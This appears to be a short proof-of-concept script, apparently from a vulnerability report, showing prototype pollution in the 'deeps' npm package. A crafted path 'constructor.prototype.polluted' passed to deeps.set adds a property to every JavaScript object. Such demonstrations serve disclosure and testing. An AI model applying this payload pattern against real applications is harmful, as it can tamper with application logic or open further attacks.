console.log({}.polluted);
const deeps = require('deeps');
deeps.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);